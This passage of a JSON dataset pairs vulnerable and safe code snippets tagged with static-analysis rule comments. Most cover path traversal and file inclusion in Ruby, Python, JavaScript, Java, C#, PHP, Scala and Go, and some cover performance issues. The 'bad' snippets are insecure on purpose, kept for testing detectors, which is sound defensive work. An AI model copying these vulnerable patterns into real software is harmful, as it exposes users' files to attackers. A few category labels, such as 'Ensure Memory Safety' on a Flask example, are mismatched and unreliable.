    "code": "import requests\n\nclass FOO(resource):\n    method_decorators = decorator()\n\n    # ruleid:flask-api-method-string-format\n    def get(self, arg1):\n        print(\"foo\")\n        string = \"foo\".format(arg1)\n        foo = requests.get(string)\n\n    # ruleid:flask-api-method-string-format\n    def get2(self,arg2):\n        someFn()\n        bar = requests.get(\"foo\".format(arg2))",
    "language": "python",
    "description": "Python/Flask - API method string format injection, CWE-134"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "good",
    "code": "import requests\n\nclass FOO(resource):\n    method_decorators = decorator()\n\n    # ok:flask-api-method-string-format\n    def get(self, somearg):\n        createRecord(somearg)\n\n    # ok:flask-api-method-string-format\n    def get(self, somearg):\n        otherFunc(\"hello world\")",
    "language": "python",
    "description": "Python/Flask - safe API method patterns"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "def test_send_file\n    # ruleid: check-send-file\n    send_file params[:file]\nend\n\ndef test_send_file2\n    # ruleid: check-send-file\n    send_file cookies[:something]\nend\n\ndef test_send_file8\n    # ruleid: check-send-file\n    send_file request.env[:badheader]\nend",
    "language": "ruby",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "def test_send_file_ok\n    # ok: check-send-file\n    send_file \"some_safe_file.txt\"\nend\n\ndef test_send_file5\n    # ok: check-send-file\n    send_file cookies.encrypted[:something]\nend",
    "language": "ruby",
    "description": "safe"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "def test_dynamic_render\n    page = params[:page]\n    #ruleid: check-render-local-file-include\n    render :file => \"/some/path/#{page}\"\nend\n\ndef test_render_with_modern_param\n    page = params[:page]\n    #ruleid: check-render-local-file-include\n    render file: \"/some/path/#{page}\"\nend\n\ndef test_render_with_first_positional_argument\n    page = params[:page]\n    #ruleid: check-render-local-file-include\n    render page\nend",
    "language": "ruby",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "def test_render_with_modern_param\n    page = params[:page]\n    #ok: check-render-local-file-include\n    render file: File.basename(\"/some/path/#{page}\")\nend\n\ndef test_param_ok\n    map = make_map\n    thing = map[params.id]\n    # ok: check-render-local-file-include\n    render :file => \"/some/path/#{thing}\"\nend\n\ndef test_render_static_template_name\n    # ok: check-render-local-file-include\n    render :update, locals: { username: params[:username] }\nend",
    "language": "ruby",
    "description": "path validated"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "def foo\n    # ruleid: avoid-tainted-file-access\n    File.open(\"/tmp/#{params[:name]}\")\n\n    # ruleid: avoid-tainted-file-access\n    Dir.open(\"/tmp/#{params[:name]}\")\n\n    # ruleid: avoid-tainted-file-access\n    File.delete(\"/tmp/#{params[:name]}\")\n\n    # ruleid: avoid-tainted-file-access\n    File.readlines(\"/tmp/#{params[:name]}\")\nend",
    "language": "ruby",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "def foo\n    # ok: avoid-tainted-file-access\n    File.open(\"/tmp/usr/bin\")\n\n    # ok: avoid-tainted-file-access\n    File.basename(\"/tmp/#{params[:name]}\")\nend",
    "language": "ruby",
    "description": "safe"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "def bad_file_disclosure\n    # ruleid: file-disclosure\n    config.serve_static_assets = true\nend",
    "language": "ruby",
    "description": "vulnerable"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "def ok_file_disclosure\n    # ok: file-disclosure\n    config.serve_static_assets = false\nend",
    "language": "ruby",
    "description": "safe"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "const {readFile} = require('fs/promises')\nconst fs = require('fs')\n\nfunction test1(fileName) {\n  // ruleid:detect-non-literal-fs-filename\n  readFile(fileName)\n    .then((resolve, reject) => {\n      foobar()\n    })\n}\n\nasync function test2(fileName) {\n  // ruleid:detect-non-literal-fs-filename\n  const data = await fs.promises.mkdir(fileName, {})\n  foobar(data)\n}\n\nfunction test3(fileName) {\n  const data = new Uint8Array(Buffer.from('Hello Node.js'));\n  // ruleid:detect-non-literal-fs-filename\n  fs.writeFile(fileName, data, (err) => {\n    if (err) throw err;\n    console.log('The file has been saved!');\n  });\n}",
    "language": "javascript",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "function okTest1(data) {\n  const data = new Uint8Array(Buffer.from('Hello Node.js'));\n  // ok:detect-non-literal-fs-filename\n  fs.writeFile('message.txt', data, (err) => {\n    if (err) throw err;\n    console.log('The file has been saved!');\n  });\n}\n\nasync function okTest2() {\n  let filehandle;\n  try {\n    // ok:detect-non-literal-fs-filename\n    filehandle = await fs.promises.open('thefile.txt', 'r');\n  } finally {\n    if (filehandle !== undefined)\n      await filehandle.close();\n  }\n}",
    "language": "javascript",
    "description": "safe"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "var path = require('path');\n\nfunction test1() {\n    function someFunc(entry) {\n        // ruleid:path-join-resolve-traversal\n        var extractPath = path.join(opts.path, entry.path);\n        return extractFile(extractPath);\n    }\n    someFunc();\n}\n\nfunction test2() {\n    function someFunc(val) {\n        createFile({\n            // ruleid:path-join-resolve-traversal\n            filePath: path.resolve(opts.path, val)\n        })\n        return true\n    }\n    someFunc()\n}",
    "language": "javascript",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "function okTest3(req,res) {\n    let somePath = req.body.path;\n    somePath = somePath.replace(/^(\\.\\.(\\/|\\\\|$))+/, '');\n    // ok:path-join-resolve-traversal\n    return path.join(opts.path, somePath);\n}\n\nfunction okTest4(req,res) {\n    let somePath = sanitizer(req.body.path);\n    // ok:path-join-resolve-traversal\n    return path.join(opts.path, somePath);\n}\n\nfunction okTest5(req,res) {\n    let somePath = req.body.path;\n    // ok:path-join-resolve-traversal\n    let result = path.join(opts.path, somePath);\n    if (result.indexOf(opts.path) === 0) {\n        return path;\n    }\n    return null\n}",
    "language": "javascript",
    "description": "path sanitized"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "import path = require('path')\nimport { Request, Response, NextFunction } from 'express'\n\nmodule.exports = function badNormal () {\n  return (req: Request, res: Response, next: NextFunction) => {\n    const file = req.params.file\n    // ruleid: express-res-sendfile\n    res.sendFile(path.resolve('ftp/', file))\n    // ruleid: express-res-sendfile\n    res.sendFile(path.join('/ftp/', file))\n    // ruleid: express-res-sendfile\n    res.sendFile(file)\n  }\n}",
    "language": "typescript",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "module.exports = function goodNormal () {\n  return (req: Request, res: Response, next: NextFunction) => {\n    const file = 'foo'\n    // ok: express-res-sendfile\n    res.sendFile(path.resolve('ftp/', file))\n    // ok: express-res-sendfile\n    res.sendfile(req.params.foo, {root: '/'});\n    // ok: express-res-sendfile\n    res.sendfile(req.params.foo, options);\n  }\n}",
    "language": "typescript",
    "description": "safe with root option or static file"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "const path = require('path')\nconst express = require('express')\nconst app = express()\n\napp.get('/test1', (req, res) => {\n    // ruleid:express-path-join-resolve-traversal\n    var extractPath = path.join(opts.path, req.query.path);\n    extractFile(extractPath);\n    res.send('Hello World!');\n})\n\napp.post('/test2', function test2(req, res) {\n    // ruleid:express-path-join-resolve-traversal\n    createFile({filePath: path.resolve(opts.path, req.body)})\n    res.send('Hello World!')\n})",
    "language": "javascript",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "app.post('/ok-test3', function (req,res) {\n    let somePath = req.body.path;\n    somePath = somePath.replace(/^(\\.\\.(\\/|\\\\|$))+/, '');\n    // ok:express-path-join-resolve-traversal\n    return path.join(opts.path, somePath);\n})\n\napp.post('/ok-test4', function (req,res) {\n    let somePath = sanitizer(req.body.path);\n    // ok:express-path-join-resolve-traversal\n    return path.join(opts.path, somePath);\n})",
    "language": "javascript",
    "description": "sanitized"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "from django.http import FileResponse\n\ndef func(request):\n    # ruleid: request-data-fileresponse\n    filename = request.POST.get(\"filename\")\n    f = open(filename, 'rb')\n    return FileResponse(f)",
    "language": "python",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "def safe(request):\n    # ok: request-data-fileresponse\n    url = request.GET.get(\"url\")\n    print(url)\n    f = open(\"blah.txt\", 'r')\n    return FileResponse(f)",
    "language": "python",
    "description": "safe"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "def unsafe(request):\n    # ruleid: path-traversal-open\n    filename = request.POST.get('filename')\n    contents = request.POST.get('contents')\n    print(\"something\")\n    f = open(filename, 'r')\n    f.write(contents)\n    f.close()\n\ndef unsafe_with(request):\n    # ruleid: path-traversal-open\n    filename = request.POST.get(\"filename\")\n    with open(filename, 'r') as fin:\n        data = fin.read()\n    return HttpResponse(data)",
    "language": "python",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "def safe(request):\n    # ok: path-traversal-open\n    filename = \"/tmp/data.txt\"\n    f = open(filename)\n    f.write(\"hello\")\n    f.close()",
    "language": "python",
    "description": "safe"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "from django.http import HttpResponse\nimport os\n\ndef foo_1(request):\n  # ruleid: path-traversal-join\n  param = request.GET.get('param')\n  file_path = os.path.join(\"MY_SECRET\", param)\n  f = open(file_path, 'r')\n  return HttpResponse(content=f, content_type=\"text/plain\")\n\ndef user_pic(request):\n    base_path = os.path.join(os.path.dirname(__file__), '../../badguys/static/images')\n    # ruleid: path-traversal-join\n    filename = request.GET.get('p')\n    data = open(os.path.join(base_path, filename), 'rb').read()\n    return HttpResponse(data, content_type=mimetypes.guess_type(filename)[0])",
    "language": "python",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "def foo_2(request):\n  # ok due to abspath\n  param = request.GET.get('param')\n  file_path = os.path.join(\"MY_SECRET\", param)\n  file_path = os.path.abspath(file_path)\n  f = open(file_path, 'r')\n  return HttpResponse(content=f, content_type=\"text/plain\")",
    "language": "python",
    "description": "path validated with abspath"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "from flask import send_file\n\napp = Flask(__name__)\n\n@app.route(\"/<path:filename>\")\ndef download_file(filename):\n  # ruleid:avoid_send_file_without_path_sanitization\n  return send_file(filename)",
    "language": "python",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "def download_not_flask_route(filename):\n  # ok:avoid_send_file_without_path_sanitization\n  return send_file(filename)",
    "language": "python",
    "description": "not a Flask route or use send_from_directory"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route(\"/route_param/<route_param>\")\ndef route_param(route_param):\n    print(\"blah\")\n    # ruleid: path-traversal-open\n    return open(route_param, 'r').read()\n\n@app.route(\"/get_param\", methods=[\"GET\"])\ndef get_param():\n    param = flask.request.args.get(\"param\")\n    # ruleid: path-traversal-open\n    f = open(param, 'w')\n    f.write(\"hello world\")\n\n@app.route(\"/post_param\", methods=[\"POST\"])\ndef post_param():\n    param = flask.request.form['param']\n    if True:\n        # ruleid: path-traversal-open\n        with open(param, 'r') as fin:\n            data = json.load(fin)\n    return data",
    "language": "python",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "@app.route(\"/ok\")\ndef ok():\n    # ok: path-traversal-open\n    open(\"static/path.txt\", 'r')\n\n@app.route(\"/route_param_ok/<route_param>\")\ndef route_param_ok(route_param):\n    print(\"blah\")\n    # ok: path-traversal-open\n    return open(\"this is safe\", 'r').read()",
    "language": "python",
    "description": "static path"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "@RestController\npublic class PreflightController {\n    @RequestMapping(\n            CONTENT_DISPOSITION_STATIC_FILE_LOCATION + FrameworkConstants.SLASH + \"{fileName}\")\n    public ResponseEntity<byte[]> fetchFile(@PathVariable(\"fileName\") String fileName)\n            throws IOException {\n        InputStream inputStream =\n                // ruleid: tainted-file-path\n                new FileInputStream(\n                        unrestrictedFileUpload.getContentDispositionRoot().toFile()\n                                + FrameworkConstants.SLASH\n                                + fileName);\n        HttpHeaders httpHeaders = new HttpHeaders();\n        httpHeaders.add(HttpHeaders.CONTENT_DISPOSITION, \"attachment\");\n        return new ResponseEntity<byte[]>(\n                IOUtils.toByteArray(inputStream), httpHeaders, HttpStatus.OK);\n    }\n\n    public static void bad(@RequestParam String user) {\n        // ruleid: tainted-file-path\n        BufferedReader fileReader = new BufferedReader(new FileReader(\"/home/\" + user + \"/\" + filename));\n    }\n}",
    "language": "java",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "public static void ok(@RequestParam String filename) {\n    ApplicationContext appContext =\n       new ClassPathXmlApplicationContext(new String[] {\"If-you-have-any.xml\"});\n\n    // ok: tainted-file-path\n    Resource resource =\n       appContext.getResource(\"classpath:com/\" + org.apache.commons.io.FilenameUtils.getName(filename));\n}",
    "language": "java",
    "description": "sanitized with FilenameUtils"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "public class Cls extends HttpServlet {\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n        String image = request.getParameter(\"image\");\n        // ruleid:httpservlet-path-traversal\n        File file = new File(\"static/images/\", image);\n\n        if (!file.exists()) {\n            log.info(image + \" could not be created.\");\n            response.sendError();\n        }\n        response.sendRedirect(\"/index.html\");\n    }\n}",
    "language": "java",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "public void ok(HttpServletRequest request, HttpServletResponse response)\nthrows ServletException, IOException {\n    // ok:httpservlet-path-traversal\n    String image = request.getParameter(\"image\");\n    File file = new File(\"static/images/\", FilenameUtils.getName(image));\n\n    if (!file.exists()) {\n        log.info(image + \" could not be created.\");\n        response.sendError();\n    }\n    response.sendRedirect(\"/index.html\");\n}",
    "language": "java",
    "description": "sanitized with FilenameUtils"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "@Path(\"/\")\npublic class Cls {\n    // ruleid:jax-rs-path-traversal\n    @GET\n    @Path(\"/images/{image}\")\n    @Produces(\"images/*\")\n    public Response getImage(@javax.ws.rs.PathParam(\"image\") String image) {\n        File file = new File(\"resources/images/\", image); //Weak point\n\n        if (!file.exists()) {\n            return Response.status(Status.NOT_FOUND).build();\n        }\n        return Response.ok().entity(new FileInputStream(file)).build();\n    }\n}",
    "language": "java",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "// ok:jax-rs-path-traversal\n@GET\n@Path(\"/images/{image}\")\n@Produces(\"images/*\")\npublic Response ok(@javax.ws.rs.PathParam(\"image\") String image) {\n    File file = new File(\"resources/images/\", FilenameUtils.getName(image)); //Fix\n\n    if (!file.exists()) {\n        return Response.status(Status.NOT_FOUND).build();\n    }\n    return Response.ok().entity(new FileInputStream(file)).build();\n}",
    "language": "java",
    "description": "sanitized with FilenameUtils"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "public class Foo{\n    public static bytes[] GetFileBad(string filename) {\n        if (string.IsNullOrEmpty(filename))\n        {\n            throw new ArgumentNullException(\"error\");\n        }\n        string filepath = Path.Combine(\"\\\\FILESHARE\\images\", filename);\n        // ruleid: unsafe-path-combine\n        return File.ReadAllBytes(filepath);\n    }\n}",
    "language": "csharp",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "public static bytes[] GetFileSafe(string filename) {\n    if (string.IsNullOrEmpty(filename))\n    {\n        throw new ArgumentNullException(\"error\");\n    }\n    filename = Path.GetFileName(filename);\n    // ok: unsafe-path-combine\n    string filepath = Path.Combine(\"\\\\FILESHARE\\images\", filename);\n    return File.ReadAllBytes(filepath);\n}\n\npublic static bytes[] GetFileSafe2(string filename) {\n    if (string.IsNullOrEmpty(filename) || Path.GetFileName(filename) != filename)\n    {\n        throw new ArgumentNullException(\"error\");\n    }\n    string filepath = Path.Combine(\"\\\\FILESHARE\\images\", filename);\n    // ok: unsafe-path-combine\n    return File.ReadAllBytes(filepath);\n}\n\npublic static bytes[] GetFileSafe3(string filename) {\n    if (string.IsNullOrEmpty(filename))\n    {\n        throw new ArgumentNullException(\"error\");\n    }\n    // ok: unsafe-path-combine\n    string filepath = Path.Combine(\"\\\\FILESHARE\\images\", Path.GetFileName(filename));\n}",
    "language": "csharp",
    "description": "sanitized with Path.GetFileName"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "<?php\n$user_input = $_GET[\"tainted\"];\n\n// ruleid: file-inclusion\ninclude($user_input);\n\n// ruleid: file-inclusion\ninclude_once($user_input);\n\n// ruleid: file-inclusion\nrequire($user_input);\n\n// ruleid: file-inclusion\nrequire_once($user_input);\n\n// ruleid: file-inclusion\ninclude(__DIR__ . $user_input);\n?>",
    "language": "php",
    "description": "vulnerable to path traversal/RFI"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "<?php\n// ok: file-inclusion\ninclude('constant.php');\n\n// ok: file-inclusion\nrequire_once('constant.php');\n\n// ok: file-inclusion\ninclude(__DIR__ . 'constant.php');\n\n// ok: file-inclusion\ninclude_safe(__DIR__ . $user_input);\n\n// ok: file-inclusion\nrequire_once(CONFIG_DIR . '/constant.php');\n\n// ok: file-inclusion\nrequire_once( dirname( __FILE__ ) . '/admin.php' );\n?>",
    "language": "php",
    "description": "constant paths"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "<?php\n$data = $_GET[\"data\"];\n// ruleid: unlink-use\nunlink(\"/storage/\" . $data . \"/test\");\n?>",
    "language": "php",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "<?php\n// ok: unlink-use\nunlink('/storage/foobar/test');\n?>",
    "language": "php",
    "description": "constant path"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "<?php\n// ruleid: wp-file-download-audit\n$json = file_get_contents( 'php://input' );\n\n// ruleid: wp-file-download-audit\nreadfile($zip_name);\n\n// ruleid: wp-file-inclusion-audit\nrequire $located;\n\n// ruleid: wp-file-inclusion-audit\ninclude_once($extension_upload_value);\n\n// ruleid: wp-file-manipulation-audit\nwp_delete_file( $file_path );\n\n// ruleid: wp-file-manipulation-audit\nunlink($file_path);\n?>",
    "language": "php",
    "description": "potential path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "class Test {\n  def bad1(value:String) = Action {\n    if (!Files.exists(Paths.get(\"public/lists/\" + value))) {\n      NotFound(\"File not found\")\n    } else {\n      // ruleid: path-traversal-fromfile\n      val result = Source.fromFile(\"public/lists/\" + value).getLines().mkString // Weak point\n      Ok(result)\n    }\n  }\n\n  def bad3(value:String) = Action {\n    if (!Files.exists(Paths.get(\"public/lists/\" + value))) {\n      NotFound(\"File not found\")\n    } else {\n      // ruleid: path-traversal-fromfile\n      val result = Source.fromFile(\"%s/%s\".format(\"public/lists\", value)).getLines().mkString\n      Ok(result)\n    }\n  }\n}",
    "language": "scala",
    "description": "vulnerable to path traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "def ok(value:String) = Action {\n    val filename = \"public/lists/\" + FilenameUtils.getName(value)\n\n    if (!Files.exists(Paths.get(filename))) {\n      NotFound(\"File not found\")\n    } else {\n      // ok: path-traversal-fromfile\n      val result = Source.fromFile(filename).getLines().mkString // Fix\n      Ok(result)\n    }\n  }",
    "language": "scala",
    "description": "sanitized with FilenameUtils"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "func unzip(archive, target string) error {\n\t// ruleid: path-traversal-inside-zip-extraction\n\treader, err := zip.OpenReader(archive)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tif err := os.MkdirAll(target, 0750); err != nil {\n\t\treturn err\n\t}\n\n\tfor _, file := range reader.File {\n\t\tpath := filepath.Join(target, file.Name)\n\t\tif file.FileInfo().IsDir() {\n\t\t\tos.MkdirAll(path, file.Mode())\n\t\t\tcontinue\n\t\t}\n\n\t\tfileReader, err := file.Open()\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tdefer fileReader.Close()\n\n\t\ttargetFile, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, file.Mode())\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tdefer targetFile.Close()\n\n\t\tif _, err := io.Copy(targetFile, fileReader); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\treturn nil\n}",
    "language": "go",
    "description": "vulnerable to zip slip"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "bad",
    "code": "func main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/bad1\", func(w http.ResponseWriter, r *http.Request) {\n\t\t// ruleid: filepath-clean-misuse\n\t\tfilename := filepath.Clean(r.URL.Path)\n\t\tfilename := filepath.Join(root, strings.Trim(filename, \"/\"))\n\t\tcontents, err := ioutil.ReadFile(filename)\n\t\tif err != nil {\n\t\t\tw.WriteHeader(http.StatusNotFound)\n\t\t\treturn\n\t\t}\n\t\tw.Write(contents)\n\t})\n\n\tmux.HandleFunc(\"/bad2\", func(w http.ResponseWriter, r *http.Request) {\n\t\t// ruleid: filepath-clean-misuse\n\t\tfilename := path.Clean(r.URL.Path)\n\t\tfilename := filepath.Join(root, strings.Trim(filename, \"/\"))\n\t\tcontents, err := ioutil.ReadFile(filename)\n\t\tif err != nil {\n\t\t\tw.WriteHeader(http.StatusNotFound)\n\t\t\treturn\n\t\t}\n\t\tw.Write(contents)\n\t})\n}",
    "language": "go",
    "description": "Clean does not prevent traversal"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Path Traversal",
    "type": "good",
    "code": "mux.HandleFunc(\"/ok2\", func(w http.ResponseWriter, r *http.Request) {\n    // ok: filepath-clean-misuse\n    filename := path.Clean(\"/\" + r.URL.Path)\n    filename := filepath.Join(root, strings.Trim(filename, \"/\"))\n    contents, err := ioutil.ReadFile(filename)\n    if err != nil {\n        w.WriteHeader(http.StatusNotFound)\n        return\n    }\n    w.Write(contents)\n})",
    "language": "go",
    "description": "prefix with \"/\" or use SecureJoin"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "bad",
    "code": "from django.http import HttpResponse\nfrom models import User\n\n\ndef other():\n    # ruleid: access-foreign-keys\n    print(User.user.id)",
    "language": "python",
    "description": "INCORRECT** - Extra query to fetch related object example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "good",
    "code": "from django.http import HttpResponse\nfrom models import User\n\n\ndef cool_view(request):\n    # ok: access-foreign-keys\n    return HttpResponse({\"user_id\": request.user.id})\n\n\nclass View(APIView):\n    def get_queryset(self):\n        # ok: access-foreign-keys\n        print(self.request.user.id)\n        return super().get_queryset()",
    "language": "python",
    "description": "CORRECT** - Use request.user.id which is already loaded example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "bad",
    "code": "# ruleid:len-all-count\nlen(persons.all())",
    "language": "python",
    "description": "INCORRECT** - Fetches all records into memory example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "good",
    "code": "# ok:len-all-count\npersons.count()",
    "language": "python",
    "description": "CORRECT** - Count performed server-side example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "bad",
    "code": "# ruleid:batch-import\nfor song in songs:\n    db.session.add(song)",
    "language": "python",
    "description": "INCORRECT** - Adding one at a time in a loop example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "good",
    "code": "# ok:batch-import\ndb.session.add_all(songs)",
    "language": "python",
    "description": "CORRECT** - Batch add all at once example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "bad",
    "code": "class CreateProducts < ActiveRecord::Migration[7.0]\n  def change\n    # ruleid: ruby-rails-performance-indexes-are-beneficial\n    add_column :users3, :email3_id, :integer, foo: bar\n    add_index :users3, [:email2_id, :other_id], name: \"asdf\"\n\n    # ruleid: ruby-rails-performance-indexes-are-beneficial\n    add_column :users4, :email4_id, :integer, { other_stuff: :asdf }\n\n    # ruleid: ruby-rails-performance-indexes-are-beneficial\n    add_column :users4, :email4_id, :bigint, { other_stuff: :asdf }\n  end\nend",
    "language": "ruby",
    "description": "INCORRECT** - Foreign key column without index example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "good",
    "code": "class CreateProducts < ActiveRecord::Migration[7.0]\n  def change\n    # ok: ruby-rails-performance-indexes-are-beneficial\n    add_column :users, :email_id, :integer\n    add_index :users, :email_id\n\n    # ok: ruby-rails-performance-indexes-are-beneficial\n    add_column :users2, :email2_id, :integer, foo: :bar\n    add_index :users2, :email2_id, name: \"asdf\"\n  end\nend",
    "language": "ruby",
    "description": "CORRECT** - Add index immediately after adding foreign key column example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "bad",
    "code": "#include <stddef.h>\n#include <string.h>\n\nint main()\n{\n    char *s = \"Hello\";\n\n    // ruleid:c-string-equality\n    if (s == \"World\") {\n        return -1;\n    }\n\n    return 0;\n}",
    "language": "c",
    "description": "INCORRECT** - Pointer comparison instead of string comparison example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "good",
    "code": "#include <stddef.h>\n#include <string.h>\n\nint main()\n{\n    char *s = \"Hello\";\n\n    // ok:c-string-equality\n    if (strcmp(s, \"World\") == 0) {\n        return 1;\n    }\n\n    // ok:c-string-equality\n    if (!strcmp(s, \"World\")) {\n        return 1;\n    }\n\n    // ok:c-string-equality\n    if (s == 0) {\n      return 1;\n    }\n\n    // ok:c-string-equality\n    if (NULL == s) {\n      return 1;\n    }\n\n    return 0;\n}",
    "language": "c",
    "description": "CORRECT** - Use strcmp for string content comparison example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "bad",
    "code": "using Microsoft.Extensions.Logging;\nusing Serilog;\nusing NLog;\n\nclass Program\n{\n    public static void SerilogSample()\n    {\n        using var serilog = new LoggerConfiguration().WriteTo.Console().CreateLogger();\n\n        var position = new { Latitude = 25, Longitude = 134 };\n        var elapsedMs = 34;\n\n        // ruleid: structured-logging\n        serilog.Information($\"Processed {position} in {elapsedMs:000} ms.\");\n    }\n\n    public static void MicrosoftSample()\n    {\n        var loggerFactory = LoggerFactory.Create(builder => {\n                builder.AddConsole();\n            }\n        );\n\n        var logger = loggerFactory.CreateLogger<Program>();\n\n        var position = new { Latitude = 25, Longitude = 134 };\n        var elapsedMs = 34;\n\n        // ruleid: structured-logging\n        logger.LogInformation($\"Processed {position} in {elapsedMs:000} ms.\");\n    }\n\n    public static void NLogSample()\n    {\n        var logger = NLog.LogManager.Setup().LoadConfiguration(builder => {\n            builder.ForLogger().WriteToConsole();\n        }).GetCurrentClassLogger();\n\n        var position = new { Latitude = 25, Longitude = 134 };\n        var elapsedMs = 34;\n\n        // ruleid: structured-logging\n        logger.Info($\"Processed {position} in {elapsedMs:000} ms.\");\n\n        // try with different name\n        var _LOG = logger;\n\n        // ruleid: structured-logging\n        _LOG.Info($\"Processed {position} in {elapsedMs:000} ms.\");\n    }\n}",
    "language": "csharp",
    "description": "INCORRECT** - String interpolation in log messages example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "good",
